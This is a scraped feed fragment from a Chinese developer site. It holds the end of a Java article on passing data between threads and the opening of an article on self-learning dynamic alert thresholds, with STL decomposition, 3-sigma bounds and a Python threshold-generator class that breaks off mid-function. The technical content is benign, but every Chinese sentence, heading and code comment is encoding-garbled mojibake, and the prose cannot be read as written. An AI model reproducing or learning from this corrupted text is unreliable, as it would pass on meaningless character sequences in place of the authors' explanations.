<pre><code class="hljs language-java" lang="java">InheritableThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocal</span>&lt;&gt;();

threadLocal.set(<span class="hljs-string">"çˆ¶çº¿ç¨‹çš„å€¼"</span>);

<span class="hljs-type">Thread</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// å­çº¿ç¨‹å¯ä»¥è®¿é—®çˆ¶çº¿ç¨‹çš„å€¼</span>
    System.out.println(threadLocal.get());
});
child.start();
</code></pre>
<h4 data-id="heading-233">çº¿ç¨‹é—´æ•°æ®ä¼ é€’</h4>
<p><strong>æ–¹å¼1ï¼šé€šè¿‡æ„é€ æ–¹æ³•ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">"æ•°æ®1"</span>;
    <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
}).start();
</code></pre>
<p><strong>æ–¹å¼2ï¼šé€šè¿‡å…±äº«å˜é‡ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java">BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.put(<span class="hljs-string">"æ•°æ®"</span>)).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.take()).start();
</code></pre>
<p><strong>æ–¹å¼3ï¼šé€šè¿‡å›è°ƒå‡½æ•°ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> processData();
    callback.onComplete(result);
}).start();
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ]]></title>    <link>https://juejin.cn/post/7592451588848156691</link>    <guid>https://juejin.cn/post/7592451588848156691</guid>    <pubDate>2026-01-08T01:23:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848156691" data-draft-id="7592088192517046315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:23:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ericinfra"/> <meta itemprop="url" content="https://juejin.cn/user/673352553084029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/673352553084029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ericinfra
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:23:47.000Z" title="Thu Jan 08 2026 01:23:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»30åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‡Œæ™¨2ç‚¹ï¼Œè¿ç»´å·¥ç¨‹å¸ˆå°åˆ˜çš„æ‰‹æœºå†æ¬¡å“èµ·åˆºè€³çš„å‘Šè­¦é“ƒå£°ã€‚è¿™å·²ç»æ˜¯æœ¬å‘¨ç¬¬16æ¬¡æ·±å¤œå‘Šè­¦äº†ã€‚ä»–ç–²æƒ«åœ°æ‰“å¼€ç›‘æ§å¹³å°ï¼Œå‘ç°CPUä½¿ç”¨ç‡è¾¾åˆ°äº†85%â€”â€”è§¦å‘äº†å›ºå®šé˜ˆå€¼80%çš„å‘Šè­¦è§„åˆ™ã€‚ç„¶è€Œï¼ŒæŸ¥çœ‹å†å²æ•°æ®åä»–å‘ç°ï¼Œè¿™ä¸ªæ—¶æ®µæ­£æ˜¯ä¸šåŠ¡é«˜å³°æœŸï¼Œ85%çš„CPUä½¿ç”¨ç‡å®Œå…¨åœ¨æ­£å¸¸èŒƒå›´å†…ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸ªä¾‹ã€‚æ ¹æ®Gartnerçš„è°ƒç ”æŠ¥å‘Šï¼Œä¼ä¸šITè¿ç»´å›¢é˜Ÿå¹³å‡æ¯å¤©æ”¶åˆ°æ•°ç™¾æ¡å‘Šè­¦ï¼Œä½†å…¶ä¸­è¶…è¿‡70%æ˜¯è¯¯æŠ¥æˆ–æ— éœ€å¤„ç†çš„å™ªéŸ³ã€‚è¿™ç§"ç‹¼æ¥äº†"ç»¼åˆå¾ä¸ä»…æ¶ˆè€—äº†å¤§é‡äººåŠ›ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼šå½“çœŸæ­£çš„æ•…éšœå‘ç”Ÿæ—¶ï¼Œå‘Šè­¦å¾€å¾€æ·¹æ²¡åœ¨å™ªéŸ³ä¸­è¢«å¿½è§†ã€‚</p>
<p>ä¼ ç»Ÿå›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿçš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼šå®ƒæ— æ³•ç†è§£ä¸šåŠ¡çš„åŠ¨æ€ç‰¹æ€§ã€‚ä¸šåŠ¡ç³»ç»Ÿçš„è´Ÿè½½å…·æœ‰æ˜æ˜¾çš„æ—¶é—´å‘¨æœŸæ€§ï¼ˆå·¥ä½œæ—¥vså‘¨æœ«ã€ç™½å¤©vså¤œæ™šï¼‰ã€å¢é•¿è¶‹åŠ¿æ€§ï¼ˆç”¨æˆ·é‡æŒç»­å¢é•¿ï¼‰ä»¥åŠçªå‘æ€§ï¼ˆä¿ƒé”€æ´»åŠ¨ã€çƒ­ç‚¹äº‹ä»¶ï¼‰ã€‚ç”¨ä¸€ä¸ªé™æ€çš„æ•°å€¼å»è¡¡é‡è¿™æ ·ä¸€ä¸ªåŠ¨æ€ç³»ç»Ÿï¼Œå¿…ç„¶ä¼šäº§ç”Ÿå¤§é‡çš„è¯¯åˆ¤ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å¦‚ä½•æ„å»ºä¸€ä¸ªå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„åŠ¨æ€é˜ˆå€¼å‘Šè­¦ç³»ç»Ÿï¼Œä»ç†è®ºåŸºç¡€åˆ°å·¥ç¨‹å®è·µï¼Œå¸®åŠ©ä½ å½»åº•è§£å†³å‘Šè­¦ç–²åŠ³é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç†è§£é—®é¢˜æœ¬è´¨ï¼šä¸ºä»€ä¹ˆå›ºå®šé˜ˆå€¼ä¼šå¤±æ•ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 ä¸šåŠ¡ç³»ç»Ÿçš„ä¸‰å¤§åŠ¨æ€ç‰¹å¾</h3>
<p>å‘¨æœŸæ€§ï¼ˆSeasonalityï¼‰</p>
<ul>
<li>æ—¥å‘¨æœŸï¼šç”µå•†ç³»ç»Ÿåœ¨æ™šä¸Š8-10ç‚¹æµé‡è¾¾åˆ°å³°å€¼</li>
<li>å‘¨å‘¨æœŸï¼šB2Bç³»ç»Ÿå‘¨æœ«æµé‡éª¤é™</li>
<li>å¹´å‘¨æœŸï¼šæ—…æ¸¸ç½‘ç«™åœ¨èŠ‚å‡æ—¥æµé‡æš´å¢</li>
</ul>
<p>è¶‹åŠ¿æ€§ï¼ˆTrendï¼‰</p>
<ul>
<li>ä¸šåŠ¡å¢é•¿ï¼šç”¨æˆ·é‡ä»10ä¸‡å¢é•¿åˆ°100ä¸‡ï¼ŒåŸºçº¿è´Ÿè½½æŒç»­ä¸Šå‡</li>
<li>ç³»ç»Ÿä¼˜åŒ–ï¼šä»£ç é‡æ„åèµ„æºæ¶ˆè€—ä¸‹é™</li>
<li>å®¹é‡æ‰©å±•ï¼šå¢åŠ æœåŠ¡å™¨åå•æœºè´Ÿè½½é™ä½</li>
</ul>
<p>éšæœºæ³¢åŠ¨ï¼ˆNoiseï¼‰</p>
<ul>
<li>æ­£å¸¸çš„ä¸šåŠ¡æŠ–åŠ¨</li>
<li>ç½‘ç»œå»¶è¿Ÿçš„éšæœºæ€§</li>
<li>ç³»ç»Ÿè°ƒåº¦çš„ä¸ç¡®å®šæ€§</li>
</ul>
<h3 data-id="heading-2">1.2 å›ºå®šé˜ˆå€¼çš„ä¸‰å¤§å›°å¢ƒ</h3>
<p>å›°å¢ƒä¸€ï¼šé˜ˆå€¼è®¾ç½®çš„ä¸¤éš¾é€‰æ‹©</p>
<p>è®¾ç½®è¿‡é«˜ â†’ çœŸå®æ•…éšœæ— æ³•åŠæ—¶å‘ç° â†’ ä¸šåŠ¡æŸå¤± è®¾ç½®è¿‡ä½ â†’ å¤§é‡è¯¯æŠ¥ â†’ å‘Šè­¦ç–²åŠ³ â†’ çœŸå®å‘Šè­¦è¢«å¿½è§†</p>
<p>å›°å¢ƒäºŒï¼šæ— æ³•é€‚åº”ä¸šåŠ¡å˜åŒ– æŸç”µå•†å¹³å°çš„çœŸå®æ¡ˆä¾‹ï¼š</p>
<ul>
<li>2022å¹´Q1ï¼šæ—¥å‡è®¢å•10ä¸‡ï¼ŒCPUé˜ˆå€¼è®¾ä¸º70%</li>
<li>2023å¹´Q1ï¼šæ—¥å‡è®¢å•50ä¸‡ï¼Œä½†é˜ˆå€¼ä»æ˜¯70%</li>
<li>ç»“æœï¼šæ¯å¤©è§¦å‘æ•°ç™¾æ¬¡å‘Šè­¦ï¼Œä½†éƒ½æ˜¯"æ­£å¸¸çš„é«˜è´Ÿè½½"</li>
</ul>
<p>å›°å¢ƒä¸‰ï¼šå¿½è§†æ—¶é—´ç»´åº¦ åŒæ ·æ˜¯CPU 80%ï¼š</p>
<ul>
<li>å‡Œæ™¨3ç‚¹ â†’ å¯èƒ½æ˜¯å¼‚å¸¸ä»»åŠ¡</li>
<li>æ™šä¸Š8ç‚¹ â†’ å¯èƒ½æ˜¯æ­£å¸¸é«˜å³°</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•åŒºåˆ†è¿™ä¸¤ç§åœºæ™¯</li>
</ul>
<h2 data-id="heading-3">äºŒã€åŠ¨æ€é˜ˆå€¼çš„ç†è®ºåŸºç¡€</h2>
<h3 data-id="heading-4">2.1 æ ¸å¿ƒæ€æƒ³ï¼šä»"ç»å¯¹å€¼åˆ¤æ–­"åˆ°"ç›¸å¯¹åç¦»åˆ¤æ–­"</h3>
<p>ä¼ ç»Ÿæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-css" lang="css">if current_value &gt; FIXED_THRESHOLD:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">expected_value = <span class="hljs-built_in">predict_based_on_history</span>(timestamp)
deviation = <span class="hljs-built_in">abs</span>(current_value - expected_value)
if deviation &gt; dynamic_threshold:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>å…³é”®è½¬å˜ï¼šä¸å†åˆ¤æ–­æŒ‡æ ‡çš„ç»å¯¹å€¼ï¼Œè€Œæ˜¯åˆ¤æ–­å½“å‰å€¼ç›¸å¯¹äº"é¢„æœŸå€¼"çš„åç¦»ç¨‹åº¦ã€‚</p>
<h3 data-id="heading-5">2.2 æ—¶é—´åºåˆ—åˆ†è§£ï¼šSTLæ–¹æ³•</h3>
<p>STLï¼ˆSeasonal and Trend decomposition using Loessï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ—¶é—´åºåˆ—åˆ†è§£æ–¹æ³•ï¼Œå®ƒå°†è§‚æµ‹å€¼åˆ†è§£ä¸ºä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š Y(t) = T(t) + S(t) + R(t)</p>
<ul>
<li>T(t) - è¶‹åŠ¿é¡¹ï¼ˆTrendï¼‰ï¼šåæ˜ é•¿æœŸå˜åŒ–æ–¹å‘</li>
<li>S(t) - å­£èŠ‚é¡¹ï¼ˆSeasonalï¼‰ï¼šåæ˜ å‘¨æœŸæ€§æ³¢åŠ¨</li>
<li>R(t) - æ®‹å·®é¡¹ï¼ˆResidualï¼‰ï¼šå»é™¤è¶‹åŠ¿å’Œå­£èŠ‚åçš„éšæœºæ³¢åŠ¨</li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹©STLï¼Ÿ</p>
<ol>
<li>é²æ£’æ€§å¼ºï¼šå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</li>
<li>çµæ´»æ€§é«˜ï¼šå­£èŠ‚å‘¨æœŸå¯è‡ªå®šä¹‰</li>
<li>å¯è§£é‡Šæ€§å¥½ï¼šåˆ†è§£ç»“æœç›´è§‚æ˜“æ‡‚</li>
</ol>
<h3 data-id="heading-6">2.3 ç»Ÿè®¡è¿‡ç¨‹æ§åˆ¶ï¼ˆSPCï¼‰ç†è®º</h3>
<p>å€Ÿé‰´å·¥ä¸šè´¨é‡ç®¡ç†ä¸­çš„æ§åˆ¶å›¾æ€æƒ³ï¼š</p>
<p>3ÏƒåŸåˆ™ï¼š</p>
<ul>
<li>æ­£æ€åˆ†å¸ƒä¸‹ï¼Œ99.7%çš„æ•°æ®è½åœ¨ Î¼Â±3Ïƒ èŒƒå›´å†…</li>
<li>è¶…å‡ºæ­¤èŒƒå›´çš„æ•°æ®ç‚¹è¢«è§†ä¸º"å¼‚å¸¸"</li>
</ul>
<p>åŠ¨æ€é˜ˆå€¼è®¡ç®—å…¬å¼ï¼š Upper_Bound(t) = T(t) + S(t) + 3 Ã— Ïƒ(R) Lower_Bound(t) = T(t) + S(t) - 3 Ã— Ïƒ(R) å…¶ä¸­ ÏƒÂ® æ˜¯æ®‹å·®çš„æ ‡å‡†å·®ï¼Œåæ˜ äº†"æ­£å¸¸æ³¢åŠ¨"çš„å¹…åº¦ã€‚</p>
<h2 data-id="heading-7">ä¸‰ã€å·¥ç¨‹å®ç°ï¼šæ„å»ºç”Ÿäº§çº§åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿ</h2>
<h3 data-id="heading-8">3.1 ç³»ç»Ÿæ¶æ„è®¾è®¡</h3>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é‡‡é›†å±‚  â”‚ â† Prometheus/InfluxDB
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é¢„å¤„ç†  â”‚ â† å¼‚å¸¸å€¼è¿‡æ»¤ã€ç¼ºå¤±å€¼å¡«å……
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ é˜ˆå€¼è®¡ç®—å¼•æ“â”‚ â† STLåˆ†è§£ + åŠ¨æ€é˜ˆå€¼ç”Ÿæˆ
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦å†³ç­–å±‚  â”‚ â† å¤šç»´åº¦åˆ¤æ–­ + å‘Šè­¦æŠ‘åˆ¶
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦è¾“å‡ºå±‚  â”‚ â† é’‰é’‰/é‚®ä»¶/PagerDuty
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<h3 data-id="heading-9">3.2 æ ¸å¿ƒä»£ç å®ç°ä¸è¯¦è§£</h3>
<h3 data-id="heading-10">3.2.1 å®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.seasonal <span class="hljs-keyword">import</span> STL
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">import</span> logging

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicThresholdGenerator</span>:
    <span class="hljs-string">"""
    åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨
    
    æ ¸å¿ƒåŠŸèƒ½ï¼š
    1. ç»´æŠ¤æ»‘åŠ¨çª—å£å†å²æ•°æ®
    2. STLæ—¶é—´åºåˆ—åˆ†è§£
    3. åŠ¨æ€é˜ˆå€¼è®¡ç®—
    4. å¼‚å¸¸æ£€æµ‹ä¸ç½®ä¿¡åº¦è¯„ä¼°
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 window_size=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤© Ã— 24å°æ—¶</span>
                 seasonal_period=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å­£èŠ‚å‘¨æœŸ</span>
                 sigma_multiplier=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3ÏƒåŸåˆ™</span>
                 min_samples=<span class="hljs-number">48</span></span>):      <span class="hljs-comment"># æœ€å°‘éœ€è¦2å¤©æ•°æ®</span>
        <span class="hljs-string">"""
        å‚æ•°è¯´æ˜ï¼š
        - window_size: æ»‘åŠ¨çª—å£å¤§å°ï¼ˆå°æ—¶æ•°ï¼‰
        - seasonal_period: å­£èŠ‚å‘¨æœŸï¼ˆå°æ—¶æ•°ï¼‰
        - sigma_multiplier: æ ‡å‡†å·®å€æ•°
        - min_samples: å¼€å§‹è®¡ç®—é˜ˆå€¼çš„æœ€å°æ ·æœ¬æ•°
        """</span>
        self.window_size = window_size
        self.seasonal_period = seasonal_period
        self.sigma_multiplier = sigma_multiplier
        self.min_samples = min_samples
        
        <span class="hljs-comment"># ä½¿ç”¨dequeå®ç°é«˜æ•ˆçš„æ»‘åŠ¨çª—å£</span>
        self.history = deque(maxlen=window_size)
        
        <span class="hljs-comment"># ç¼“å­˜ä¸Šä¸€æ¬¡çš„åˆ†è§£ç»“æœï¼Œç”¨äºå¼‚å¸¸æ£€æµ‹</span>
        self.last_decomposition = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        self.stats = {
            <span class="hljs-string">'total_points'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'alerts_triggered'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'false_positive_rate'</span>: <span class="hljs-number">0.0</span>
        }
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_and_get_thresholds</span>(<span class="hljs-params">self, new_data_point, timestamp</span>):
        <span class="hljs-string">"""
        æ›´æ–°æ•°æ®å¹¶è¿”å›å½“å‰åŠ¨æ€é˜ˆå€¼
        
        Args:
            new_data_point: æ–°çš„ç›‘æ§æŒ‡æ ‡å€¼
            timestamp: æ—¶é—´æˆ³ï¼ˆdatetimeå¯¹è±¡ï¼‰
        
        Returns:
            dict: åŒ…å«é˜ˆå€¼ã€å‘Šè­¦çŠ¶æ€ã€ç½®ä¿¡åº¦ç­‰ä¿¡æ¯
        """</span>
        <span class="hljs-comment"># 1. æ•°æ®éªŒè¯ä¸é¢„å¤„ç†</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_data(new_data_point):
            <span class="hljs-keyword">return</span> self._get_default_response(new_data_point)
        
        <span class="hljs-comment"># 2. æ›´æ–°å†å²æ•°æ®</span>
        self.history.append({
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'value'</span>: new_data_point
        })
        self.stats[<span class="hljs-string">'total_points'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 3. æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ•°æ®è¿›è¡Œåˆ†æ</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &lt; self.min_samples:
            <span class="hljs-keyword">return</span> self._get_bootstrap_response(new_data_point)
        
        <span class="hljs-comment"># 4. æ‰§è¡Œæ—¶é—´åºåˆ—åˆ†è§£</span>
        <span class="hljs-keyword">try</span>:
            decomposition = self._perform_stl_decomposition()
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            self.logger.error(<span class="hljs-string">f"STLåˆ†è§£å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            <span class="hljs-keyword">return</span> self._get_fallback_response(new_data_point)
        
        <span class="hljs-comment"># 5. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        thresholds = self._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># 6. å¼‚å¸¸æ£€æµ‹</span>
        is_alert, alert_type = self._detect_anomaly(
            new_data_point, 
            thresholds, 
            decomposition
        )
        
        <span class="hljs-comment"># 7. è®¡ç®—ç½®ä¿¡åº¦</span>
        confidence = self._calculate_confidence(decomposition)
        
        <span class="hljs-comment"># 8. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
        <span class="hljs-keyword">if</span> is_alert:
            self.stats[<span class="hljs-string">'alerts_triggered'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 9. æ„å»ºè¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'current_value'</span>: new_data_point,
            <span class="hljs-string">'expected_value'</span>: thresholds[<span class="hljs-string">'expected'</span>],
            <span class="hljs-string">'upper_bound'</span>: thresholds[<span class="hljs-string">'upper'</span>],
            <span class="hljs-string">'lower_bound'</span>: thresholds[<span class="hljs-string">'lower'</span>],
            <span class="hljs-string">'is_alert'</span>: is_alert,
            <span class="hljs-string">'alert_type'</span>: alert_type,
            <span class="hljs-string">'confidence'</span>: confidence,
            <span class="hljs-string">'deviation_percentage'</span>: self._calculate_deviation_percentage(
                new_data_point, thresholds[<span class="hljs-string">'expected'</span>]
            ),
